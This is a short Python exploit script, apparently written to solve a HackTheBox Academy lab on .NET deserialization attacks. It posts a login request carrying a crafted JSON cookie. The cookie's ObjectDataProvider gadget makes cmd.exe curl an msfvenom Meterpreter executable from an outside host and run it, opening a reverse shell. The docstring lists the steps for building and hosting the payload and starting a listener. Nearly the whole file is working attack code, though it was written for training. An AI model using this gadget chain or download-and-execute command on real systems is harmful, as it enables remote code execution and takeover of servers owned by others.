#! /usr/bin/env python3

'''Created this script to solve the HackTheBox Academy lab called 'Example 1: JSON' for the module called 'Advanced Deserialization Attacks'. 
This script exploits an insecure deserialization on a cookie to get a reverse shell.

Before running the script do the following:
1. Create msfvenom shell using payload msfvenom/windows/x64/meterpreter/reverse_tcp.exe
2. Run a python server to host the generated shell.
3. Open a metasploit exploit handler listener to catch the reverse shell.
'''

import requests

target= "10.129.228.224:8000"
proxies= {"http":"http://127.0.0.1:8080"}
headers= {"Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "Mozilla/5.0"
          }

data= f"username=pentest&password=pentest&rememberMe=on"

cookies= {"TTREMEMBER":'{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","ObjectType":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","MethodParameters":{"$type":"MS.Internal.Data.ParameterCollection, PresentationFramework","$values":["C:\\\\Windows\\\\System32\\\\cmd.exe","/c curl 10.10.10.10:4267/msfvenom.exe -o \\\\Users\\\\Public\\\\Documents\\\\msfvenomb.exe && \\\\Users\\\\Public\\\\Documents\\\\msfvenomb.exe"]},"MethodName":"Start"}'}

response= requests.post(url=f"http://{target}/Auth/Login", proxies=proxies, headers=headers, cookies=cookies, data=data, verify=False, allow_redirects=True)
